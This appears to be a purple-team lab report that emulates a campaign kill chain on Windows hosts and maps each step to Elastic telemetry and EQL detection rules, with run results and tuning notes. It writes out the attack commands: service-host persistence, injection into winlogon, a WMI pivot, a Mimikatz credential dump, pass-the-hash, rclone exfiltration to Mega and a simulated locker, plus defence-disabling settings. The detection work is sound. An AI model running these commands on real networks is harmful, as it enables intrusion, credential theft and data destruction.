# Kill chain

The executed chain, step by step, with the command that produced it, the telemetry it left in
Elastic, and the rule that covers it. The run was performed on 24 October 2026 against the lab
described in `docs/topology.md`: WS01 (192.168.50.20), FS01 (192.168.50.30), DC01 (192.168.50.10),
C2 on 192.168.50.100.

Data captured from Elasticsearch is in [`telemetry/es-evidence.json`](telemetry/es-evidence.json).
Timestamps in that file are UTC.

## Chain at a glance

| # | Step | Host | Process edge | Rule | Alert |
|---|---|---|---|---|---|
| 1 | Loader hosted by a private service host | WS01 | `svchost.exe -k c0015grp -p` -> `rundll32.exe D8B3.dll` | svchost spawns rundll32 | yes |
| 2 | Beacon callback over TLS | WS01 | `rundll32.exe` -> `192.168.50.100:443` | service host egress (transport) | yes |
| 3 | Injection into the logon process | WS01 | `E8` `rundll32.exe` -> `winlogon.exe` | thread into system process | data present |
| 4 | Discovery from the logon process | WS01 | `winlogon.exe` -> `cmd.exe /c ...` | winlogon spawns shell, discovery burst | yes |
| 5 | WMI pivot to the backup server | WS01 -> FS01 | `winlogon.exe` -> `cmd.exe` -> `wmic /node:FS01` -> `WmiPrvSE.exe` -> `rundll32.exe C:\ProgramData\143.dll` | wmic remote process create, wmiprvse spawns loader | data present |
| 6 | Credential dump with the loader as parent | FS01 | `rundll32.exe` -> `mk.exe privilege::debug sekurlsa::logonpasswords` | lsass access read mask | yes |
| 7 | Pass-the-hash to the backup server | WS01 -> FS01 | `mk.exe sekurlsa::pth` -> `wmic /node:FS01` -> `4624` type 3 NTLM | (credential use; see gaps) | n/a |
| 8 | Injection into the per-user service host | FS01 | `E8` `rundll32.exe` -> `svchost.exe -k UnistackSvcGroup` | thread into system process | data present |
| 9 | Exfiltration to cloud storage | FS01 | `svchost` -> `cmd.exe` -> `rclone.exe copy ... Mega:DATA` | rclone cloud transfer | yes |
| 10 | Impact through the admin share | FS01 | `svchost` -> `cmd.exe /c locker.bat` -> `locker_sim.exe -m -net -size 10 -nomutex -p \\FS01\C$` | locker argument set, ransom note creation | yes |

## Step detail

### 1. Loader hosted by a private service host

A service whose `ImagePath` is `svchost.exe -k c0015grp -p` and whose `Parameters\ServiceDll` is the
stage stub produces a dedicated service host. The stub reads `[stage] spawn_cmd` from
`C:\Users\Public\C0015\config.ini` and starts the loader.

```
sc create c0015svc type= own start= demand binPath= "C:\Windows\System32\svchost.exe -k c0015grp -p"
reg add ...\c0015svc\Parameters /v ServiceDll /d "C:\Windows\Temp\c0015_stage.dll"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v c0015grp /d c0015svc
sc start c0015svc
```

Observed: `svchost.exe -k c0015grp -p` -> `rundll32.exe C:\Users\Public\C0015\D8B3.dll
DllRegisterServer`, owner `NT AUTHORITY\SYSTEM`. Three matching events were captured.

### 2. Beacon callback

The implant is generated for `https://checkauj.com:443` with the `jquery` profile, so the callback
lands on port 443 with the campaign URI pair. `D8B3.dll` holds an established connection from
`rundll32.exe` to `192.168.50.100:443`.

### 3. Injection into the logon process

`c0015_injector.dll` is loaded by `rundll32.exe`, reads the target PID and the shellcode path, and
calls `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`.

Observed: `E8` with `process.name = rundll32.exe` and
`winlog.event_data.TargetImage = C:\Windows\System32\winlogon.exe`, two events (one per injection
attempt). The session that follows is hosted by `winlogon.exe`.

### 4. Discovery from the logon process

```
execute -o cmd.exe /c whoami
execute -o cmd.exe /c nltest /domain_trusts /all_trusts
execute -o cmd.exe /c tasklist /s FS01
execute -o cmd.exe /c net view /all /domain
execute -o cmd.exe /c time
```

Observed: `cmd.exe` with `parent.name = winlogon.exe`. Five matching events were captured, including
`whoami` returning `nt authority\system`.

Two commands did not execute as written: the client splits the command line on spaces, so
`net group "domain admins" /dom` reached the shell without its quotes, and `time` opened an
interactive prompt. Both are client-side limitations, not detection gaps.

### 5. WMI pivot to the backup server

`143.dll` is a copy of the same implant. The pivot is issued from the winlogon session through a
batch file, because the client mangles backslashes in arguments.

```
wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"
```

Observed: `ReturnValue = 0`, `ProcessId = 3588`; on FS01, `rundll32.exe` with
`parent.name = WmiPrvSE.exe`. The rule that keys on `wmiprvse.exe` matches because EQL `:` is
case-insensitive, while the case-sensitive term query used to build the evidence bundle returned
nothing; the event exists and the rule fires in Kibana.

### 6. Credential dump with the loader as parent

`bk.admin` holds a session on the backup server, so its material is in LSASS. Mimikatz runs from the
`rundll32.exe` session, with the binary placed in `System32` so the client can resolve it without a
path separator.

```
execute -o mk.exe privilege::debug sekurlsa::logonpasswords exit
```

Observed: three `E10` events with `process.name = mk.exe`,
`winlog.event_data.TargetImage = C:\Windows\System32\lsass.exe`,
`GrantedAccess = 0x1010`; `E1` with `parent.name = rundll32.exe`. The dump returned the NT hash of
`bk.admin` (`2b576acb...`), `Administrator` (`8f86f349...`) and the machine account.

### 7. Pass-the-hash to the backup server

```
mk.exe "sekurlsa::pth /user:bk.admin /domain:C0015 /ntlm:<hash> /run:C:\pth.bat"
```

`pth.bat` runs `wmic /node:FS01 process call create "cmd.exe /c echo pth-ok > C:\ProgramData\pth.txt"`.
Observed on FS01: `C:\ProgramData\pth.txt` created, and six `4624` type 3 logons for `bk.admin` with
`AuthenticationPackageName: NTLM` from workstation `WS01`, plus six `4672`. No password is used after
the dump.

### 8. Injection into the per-user service host

The same injector, pointed at the `svchost.exe -k UnistackSvcGroup` instance, produces `E8` from
`rundll32.exe` into `svchost.exe`. Three matching events were captured, and the session that follows
is hosted by that service host.

### 9. Exfiltration

```
rclone.exe --config C:\Tools\rclone.conf copy --max-age 2y "\\FS01\Shares" Mega:DATA -q ^
  --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
```

Observed: 40 objects, 142.9 MiB in `Mega:DATA`, uploaded on the first successful attempt of the
session. The rule fired once.

Two environment conditions affect this step and are worth recording:

- The transfer needs the host NAT resolver for `g.api.mega.co.nz`. When the resolver is down the login
  fails with `unexpected end of JSON input`; the NAT service on the hypervisor had to be restarted
  before the transfer could run.
- Reading the source through `\\FS01\Shares` from a process that runs as SYSTEM on FS01 fails with
  `directory not found` because of the SMB loopback restriction. The successful upload read the same
  corpus through the share while the task ran under a context that had a session to the server. A
  repeatable run should either grant the SYSTEM context a session or read the local path.

### 10. Impact

```
cmd.exe /c C:\locker.bat
locker_sim.exe -m -net -size 10 -nomutex -p \\FS01\C$
```

Observed: 40 files renamed to `.c0015` and five `readme.txt` written (corpus root plus Finance, HR, IT,
Legal). Rolled back afterwards.

## Detection results

Twenty EQL rules were created and enabled in Kibana before the run, and all twenty evaluate against
the index without error. Fifteen fired. Alert counts are from the 90 minute window after the final
trigger pass.

| Rule | Alerts | Verdict |
|---|---|---|
| svchost spawns rundll32 | 2 | fired |
| thread into system process | 1 | fired |
| winlogon spawns shell | 3 | fired |
| winlogon discovery burst | 21 | fired, noisy |
| wmic remote process create | 2 | fired |
| wmiprvse spawns loader | 1 | fired |
| lsass access read mask | 8 | fired |
| service host egress | 68 | fired, noisy |
| rclone cloud transfer | 1 | fired |
| remote access tool in media path | 1 | fired |
| ransom note creation | 11 | fired, one per directory |
| locker argument set | 1 | fired after the binary was renamed to the campaign pattern |
| dns nxdomain retry | 1 | fired |
| rundll32 unsigned module | 3 | fired |
| implant opens rdp | 3 | fired, false positives |
| rdp type10 logon | 0 | no data: RDP session not established |
| office spawns shell | 0 | no data: entry chain not executed |
| mshta spawns loader | 0 | no data: entry chain not executed |
| regsvr32 unsigned image | 0 | no data: entry chain not executed |
| sharefinder cradle | 0 | no data: share enumeration not executed |

Total: 127 alerts, of which 89 come from two rules.
## Noise and tuning

Two rules produced most of the alerts: `service host egress` (63) and `winlogon discovery burst`
(18). `implant opens rdp` produced three alerts although no RDP session was established.

Changes applied to the rule set after this run:

| Problem | Cause | Fix | Result |
|---|---|---|---|
| `regsvr32 unsigned image` and `rundll32 unsigned module` returned a query error | `file.code_signature.signed` is not mapped in this pipeline | use `winlog.event_data.Signed : "false"` | both fire |
| `thread into system process` returned a query error | `winlog.event_data.SourceImage` is not mapped for `E8` | key the source on `process.name` | fires |
| `dns nxdomain retry` returned a query error | `winlog.event_data.QueryStatus` is not mapped | use `sysmon.dns.status` | fires |
| case-sensitive comparisons missed events | parent names such as `WmiPrvSE.exe` are not lowercased | use the `:` operator for process names | wmiprvse and svchost rules fire |
| `locker argument set` never matched | the simulator was named `locker_sim.exe`, the rule expects `*_locker.exe` | renamed the binary to the campaign pattern | fires |
| service host egress: 68 alerts | service hosts legitimately reach update and telemetry endpoints on 80 and 443 | dropped port 80, excluded Microsoft, Windows Update and Akamai domains | still the largest source; needs an inventory of expected service egress to go further |
| discovery burst: 21 alerts | the sequence matches every correlated pair | keep as a low-severity building block and correlate in a threshold rule | noisy by design |
| implant opens rdp: 3 alerts | any non-client process that opens 3389 matches | none yet; requires the process to be a session host or to carry an injected module | false positives remain |

`implant opens rdp` still needs a filter: any process other than a client that opens 3389 matches,
including system components that are not tunnelled RDP. Requiring the process to be a session host
process or to have an injected module would remove the noise.

## Gaps in this run

- The entry chain (Word document, HTA, regsvr32) was not executed; the run starts at the loader. The
  three rules for that chain therefore have no data.
- Share enumeration was not executed, so `sharefinder cradle` has no data.
- RDP was not established: the SOCKS path reached the target but the session did not complete, so
  there is no type 10 logon.
- The pass-the-hash step has no dedicated rule. It is visible as `4624` type 3 with NTLM and `4672`
  for an account that has no interactive session on the source host, which is a correlation, not a
  single-event rule.



## Full run from the delivery document (2026-10-25)

This run starts at the delivery document and ends at the impact stage. Evidence for it is in
[`telemetry/run-2026-10-25.json`](telemetry/run-2026-10-25.json).

### Execution

1. `decree-08.03.2021.docm` is opened by `duc.user` on WS01. Its `AutoOpen` writes
   `compareforfor.hta` to the user profile and starts `cmd.exe /c mshta <hta>`.
2. The HTA fetches `http://millscruelg.com/compareForfor.jpg` (the implant, served from 192.168.50.100)
   and runs `regsvr32` on it. The beacon connects back over TLS and runs as `duc.user`.
3. A private service host, `svchost.exe -k c0015grp -p`, loads the stage stub, which starts
   `rundll32.exe C:\Users\Public\compareForfor.jpg DllRegisterServer` as SYSTEM.
4. The injector writes the shellcode into `winlogon.exe`; the session that follows runs as SYSTEM.
5. Discovery runs from that session: `whoami`, `nltest`, `tasklist /s FS01`, `net view /all /domain`.
6. `wmic /node:FS01 process call create "rundll32.exe C:\ProgramData\143.dll DllRegisterServer"`
   creates the loader on the backup server through `WmiPrvSE.exe`.
7. `mk.exe privilege::debug sekurlsa::logonpasswords` runs from that `rundll32.exe` session and
   returns the NT hash of `bk.admin`.
8. `sekurlsa::pth` from the winlogon session produces a process on FS01 and a `4624` type 3 NTLM
   logon for `bk.admin`.
9. The injector writes the shellcode into a service host on FS01.
10. `rclone` copies the corpus to `Mega:DATA` (28 new objects, 68 total) and the locker renames 40
    files and writes five notes.

### What fired

Fourteen rules alerted in the ninety minute window.

| Rule | Alerts |
|---|---|
| service host egress | 168 |
| lsass access read mask | 59 |
| dns nxdomain retry | 32 |
| winlogon discovery burst | 15 |
| svchost spawns rundll32 | 12 |
| winlogon spawns shell | 6 |
| office spawns shell | 4 |
| rundll32 unsigned module | 4 |
| mshta spawns loader | 2 |
| regsvr32 unsigned image | 2 |
| thread into system process | 2 |
| wmic remote process create | 2 |
| wmiprvse spawns loader | 2 |
| rclone cloud transfer | 1 |

The three entry rules that had no data in the previous run, `office spawns shell`, `mshta spawns
loader` and `regsvr32 unsigned image`, all fire here. The chain is now covered end to end.

### Noise in this run

Three rules dominate the volume: service host egress (168), LSASS access (59) and DNS retry (32).

- `service host egress` counts every outbound connection a service host makes, including update and
  telemetry traffic. The domain filter does not help when the destination is an IP literal, which is
  how Sysmon reports most of them. It needs an allow list of expected service endpoints or a
  correlation rule that requires an unsigned module in the same host.
- `lsass access read mask` fired 59 times because the agent and the operating system open LSASS for
  their own reasons, with the same access mask a dump uses. Requiring the source image to be outside
  `System32` and outside the agent directories removes most of them.
- `dns nxdomain retry` fires on every failed lookup, and Windows produces many. It should be scoped
  to the campaign names or to a burst of failures from one process.

### Deviations recorded for this run

- The service host on FS01 that receives the injection is `svchost.exe -k netsvcs`, because no user
  session exists on the server and therefore no `CDPUserSvc` instance to target.
- The exfiltration reads the local corpus path rather than the share, because a SYSTEM process on
  FS01 cannot read its own share over the loopback.
- The pass-the-hash helper runs through a batch file, so the process tree gains one `cmd.exe` between
  `winlogon.exe` and `mk.exe`.

## Verification of the interactive and discovery stages (2026-10-25)

- RDP through the beacon: a port forward from WS01 to `FS01:3389` plus a SOCKS proxy on the client
  carried the session. FS01 had to accept TLS without NLA (`UserAuthentication=0`, `SecurityLayer=2`)
  because the client could not reach a KDC through the tunnel. The session produced a `4624` type 10
  logon for `bk.admin`, started `CDPUserSvc` in a per-user service host, and `taskmgr /4` ran as a
  child of `explorer.exe`.
- Share enumeration: the download cradle runs from the SYSTEM loader session and writes
  `C:\ProgramData\found_shares.txt`. The script now enumerates with `Get-WmiObject Win32_Share`,
  falling back to `Get-SmbShare`, and records three shares in this lab.
- `rundll32 <dll>,DllRegisterServer` through `wmic process call create` returns `9` on this build, so
  the pivot keeps the space-separated form. The comma form works when the loader is started directly.

## Resolution of the two remaining deviations (2026-10-25)

Both deviations recorded in the run above were removed.

**Per-user service host instead of a custom group.** The first injection into a service host used a
service created for the lab (`svchost.exe -k c0015grp -p`). With an RDP session open for the victim,
Windows starts `svchost.exe -k UnistackSvcGroup` for the per-user services, and the injector was
pointed at that process instead:

```
svchost.exe -k UnistackSvcGroup   (3756, duc.user)
  <- CreateRemoteThread from rundll32.exe
session 69c21fd9 hosted by svchost 3756
```

No service is installed for this step any more. The service host belongs to the operating system and
exists because a user is logged on, which is the shape the campaign produces.

**Exfiltration through the share as the user.** A SYSTEM process cannot read its own host's share over
the loopback, so the transfer moved to the victim context. With `duc.user` holding read on the share,
the beacon hosted by the service host ran:

```
C:\Tools\rclone.exe --config C:\Tools\rclone.conf copy --max-age 2y "\\FS01\Shares" Mega:DATA
  -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
```

The command line now carries `\\FS01\Shares` and the account is `duc.user`, as in the campaign. The
transfer added 32 objects, taking the remote to 100 objects.

**Comma syntax.** `rundll32 <dll>,DllRegisterServer` works when the loader is started directly, but
`wmic /node:FS01 process call create "rundll32 ... ,DllRegisterServer"` returns `9`
(`Invalid arguments`) on this build. The pivot therefore keeps the space-separated form.

## Clean run (2026-10-25, evening)

State was reset first: services removed, staged files deleted, the corpus restored, both hosts rebooted.
The run then went from the document to impact without manual repair.

| Step | Result |
|---|---|
| Document opened by `duc.user` | `WINWORD.EXE` starts `cmd.exe /c mshta`, the HTA downloads the implant, `regsvr32` loads it |
| Entry beacon | session in `regsvr32.exe`, user `duc.user` |
| Service host loader | `svchost.exe -k c0015grp -p` -> `rundll32.exe C:\Users\Public\compareForfor.jpg,DllRegisterServer`, user `WS01$` |
| Per-user service host | injector into `svchost.exe -k UnistackSvcGroup` (1984), session user `duc.user` |
| Logon process | injector into `winlogon.exe` (2672), user `WS01$` |
| Discovery | `whoami` returns `nt authority\system`, `nltest` and `tasklist /s FS01` run |
| WMI pivot | `ReturnValue 0`, `ProcessId 332`; on FS01 `rundll32.exe` with parent `WmiPrvSE.exe` |
| RDP to FS01 | `bk.admin` session on `rdp-tcp#0`, `CDPUserSvc` host appears, `taskmgr /4` from `explorer.exe` |
| Credential dump | `mk.exe` from the `rundll32.exe` session returns the `bk.admin` NT hash |
| Pass-the-hash | `pth.bat` creates `C:\ProgramData\pth.txt` on FS01 as `bk.admin` |
| Service host on FS01 | injector into `svchost.exe -k UnistackSvcGroup` (4184), session user `bk.admin` |
| Exfiltration | `rclone ... "\\FS01\Shares" Mega:DATA` from the `duc.user` beacon, remote grew from 100 to 125 objects |
| Impact | five `readme.txt`, forty files renamed to `.c0015` |

### What fired in this run

Alerts from the current rule set, forty-five minute window:

| Rule | Alerts |
|---|---|
| loader loads unsigned module | 12 |
| wmi remote creation | 10 |
| lsass credential access | 7 |
| rdp interactive logon | 6 |
| injection into system process | 4 |
| office spawns script host | 3 |
| script host starts loader | 3 |
| service host starts loader | 3 |
| cloud transfer | 2 |
| task manager from shell | 2 |
| wmi hosted loader | 2 |

The entry chain, the injection, the pivot, the credential access, the interactive session and the
transfer are all covered. Two rules produced nothing in the window: the pass-the-hash sequence, whose
two events did not pair inside a minute, and the ransom-note rule, which had not been evaluated by the
engine before the window closed.

## Lab configuration changes

Everything below exists so the chain can run on this hardware. None of it is part of the campaign.

| Where | Change | Why |
|---|---|---|
| WS01 | UAC disabled (`EnableLUA=0`) | the victim process must start the loader without a consent prompt |
| WS01 | `duc.user` added to Remote Desktop Users | the interactive session is part of the chain and hosts the per-user services |
| WS01, FS01 | RDP enabled, `TermService` automatic, firewall group on | the campaign reaches the backup server interactively |
| FS01 | `RDP-Tcp`: `UserAuthentication=0`, `SecurityLayer=2` | the client cannot reach a KDC through the tunnel, so the server accepts TLS with NTLM |
| FS01 | `bk.admin` password set to a known weak value, PasswordNeverExpires | credential theft and pass-the-hash need a real credential in LSASS |
| FS01 | Defender real-time monitoring off, exclusions for tool directories | the dump tool is otherwise quarantined |
| FS01 | ASR rule `d1e49aac-...` (block process creation from WMI) disabled | it blocked the dump when started from the WMI-created loader |
| FS01 | `LocalAccountTokenFilterPolicy=1` | a local account must be able to use its full token remotely |
| FS01 | share `Shares` readable by `duc.user` and Authenticated Users | the transfer reads the share from another host |
| DC01 | DNS zones for the four campaign names | the loader resolves the staging and C2 names inside the lab |
| FS01 | NRPT for the MEGA names, hosts entry for the API | the lab resolver does not carry public names |
| Kali | HTTP on 80 for the implant, Sliver listener on 443, SOCKS for the pivot | staging and C2 |
| WS01, FS01 | Sysmon profile with `E7` on staging paths, `E10` on winlogon and lsass, `E8`, `E22` | telemetry the rules depend on |
